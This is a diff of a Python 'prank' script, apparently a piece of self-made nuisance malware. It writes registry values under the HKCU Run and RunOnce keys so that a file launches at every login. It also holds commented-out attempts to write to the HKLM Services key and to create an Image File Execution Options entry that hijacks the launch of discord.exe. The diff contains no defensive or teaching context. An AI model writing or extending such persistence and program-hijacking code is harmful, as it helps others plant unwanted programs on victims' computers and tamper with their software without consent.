@@ -11,7 +11,6 @@ def create_file():
 def add_to_startup():
     hkcu_keys = [r"SOFTWARE\Microsoft\Windows\CurrentVersion\Run",
                 r"SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnce"]
-    hklm_keys = [r"SYSTEM\CurrentControlSet\Services"]
     value_name = "GetPranked"
     documents_path = os.path.join(os.path.expanduser("~"), "Documents")
     text_file_path = os.path.join(documents_path, "prank.txt")
@@ -23,14 +22,32 @@ def add_to_startup():
                 reg.SetValueEx(reg_key, value_name, 0, reg.REG_SZ, file_path)
         except PermissionError:
             print("failed", key)
-            pass
-    for key in hklm_keys:
-        try:
-            with reg.OpenKey(reg.HKEY_LOCAL_MACHINE, key, 0, reg.KEY_SET_VALUE) as reg_key:
-                reg.SetValueEx(reg_key, value_name, 0, reg.REG_SZ, file_path)
-        except PermissionError:
-            print("failed", key)
-            pass
+            # pass
+
+
+
+    # Local Machine registry keys (only work if run as administrator)
+    '''
+    try:
+        key = r"SYSTEM\CurrentControlSet\Services"
+        with reg.OpenKey(reg.HKEY_LOCAL_MACHINE, key, 0, reg.KEY_SET_VALUE) as reg_key:
+            reg.SetValueEx(reg_key, value_name, 0, reg.REG_SZ, file_path)
+    except PermissionError:
+        print("failed", key)
+        # pass
+
+    try:
+        key = r"SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options"
+        with reg.OpenKey(reg.HKEY_LOCAL_MACHINE, key, 0, reg.KEY_WRITE) as reg_key:
+            target_key_path = os.path.join(key, r"discord.exe")
+            target_key = reg.CreateKey(reg_key, target_key_path)
+            reg.SetValueEx(target_key, value_name, 0, reg.REG_SZ, file_path)
+    except PermissionError:
+        print("failed", key)
+        # pass
+    '''
+
+
 
     # Attempt to set a file to run when the screensaver activates -- didn't work
     '''
